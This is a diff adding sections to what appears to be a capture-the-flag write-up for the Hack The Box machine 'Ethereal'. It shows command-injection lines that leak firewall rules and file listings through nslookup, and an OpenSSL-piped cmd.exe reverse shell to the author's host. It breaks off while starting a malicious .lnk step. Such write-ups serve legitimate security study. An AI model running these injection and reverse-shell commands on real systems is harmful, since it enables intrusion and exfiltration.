@@ -26,7 +26,7 @@ Not shown: 65532 filtered ports
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
+|_Cant get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
 | ftp-syst:
 |_  SYST: Windows_NT
 80/tcp   open  http    Microsoft IIS httpd 10.0
@@ -175,3 +175,112 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 ```
 
 Great! So we can get data from DNS.
+
+## Enumeration using injection
+
+During my **really** slow enumeration, I found a world writable directory and used `& netsh advfirewall firewall show rule name=all dir=out verbose > c:\users\public\desktop\shortcuts\firewall_rules.txt` to list all the firewall rules in the .txt file.
+Using `& for /f "eol=- skip=100 tokens=1-10*" %i in (c:\users\public\desktop\shortcuts\firewall_rules.txt) do nslookup %i_%j_%k_%l_%m_%o_%p_%q <my ip>`, I got the data in my terminal.
+
+I found that the following rules had been set.
+
+```console
+Rule Name: Allow TCP Ports 136
+Enabled: Yes
+Direction: Out
+Profiles: Domain,Private,Public
+Grouping:
+LocalIP: Any
+RemoteIP: Any
+Protocol: TCP
+LocalPort: Any
+RemotePort: 73,136      
+Edge traversal: No     
+InterfaceTypes: Any      
+Security: NotRequired      
+Rule source: Local Setting    
+Action: Allow  
+```
+
+Also, I located a OpenSSL binary in the `C:` drive. Using `& for /f "usebackq tokens=*" %i in (`dir /b c:\progra~2\openss~1.0\bin\`) do nslookup %i <ip>`, I listed the contents on the folder and found a `openssl.exe` file.
+
+## Shell using OpenSSL
+
+Let's test whether we can connect to a server using this openssl binary.
+I created key and certificate for our server.
+
+```bash
+pswapnil@noone:~$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
+Generating a RSA private key
+....+++++
+................................+++++
+writing new private key to 'key.pem'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+pswapnil@noone:~$ ls *.pem
+cert.pem  key.pem
+```
+
+I ran a OpenSSL server using `openssl s_server -quiet -key key.pem -cert cert.pem  -port 73` and I used `& quiet ( echo "abcde" | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect <ip>:73 )` to test the connection.
+
+```bash
+pswapnil@noone:~$ sudo openssl s_server -quiet -key key.pem -cert cert.pem  -port 73
+"abcde"
+```
+
+Great! We can send data over using OpenSSL. Now, in order to get a shell, we need to set up two SSL servers running on my machine and use `& c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect <ip>:73 | cmd.exe /k /q | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect <ip>:136` to get a shell.
+I already have a server running on port 73 now we will start one on port 136 and put the command above into the browser.
+
+```bash
+root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 136
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>
+```
+
+And we have a shell! Let's hunt for the `user.txt` file.
+
+```bash
+c:\windows\system32\inetsrv>whoami
+ethereal\alan
+```
+
+I could not find a user.txt file on alan's desktop but found a `note-draft.txt` file.
+
+```bash
+c:\Users\alan\Desktop>type note-draft.txt
+I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.
+
+- Alan
+```
+
+Shortcut on a public desktop? Let's find out.
+
+```bash
+c:\Users\Public\Desktop\Shortcuts>dir
+ Volume in drive C has no label.
+ Volume Serial Number is FAD9-1FD5
+
+ Directory of c:\Users\Public\Desktop\Shortcuts
+
+07/17/2018  08:15 PM    <DIR>          .
+07/17/2018  08:15 PM    <DIR>          ..
+07/06/2018  02:28 PM             6,125 Visual Studio 2017.lnk
+               1 File(s)          6,125 bytes
+               2 Dir(s)  15,427,989,504 bytes free
+```
+
+I generated a `.lnk` file using [LNKUp](https://github.com/Plazmaz/LNKUp) using ``
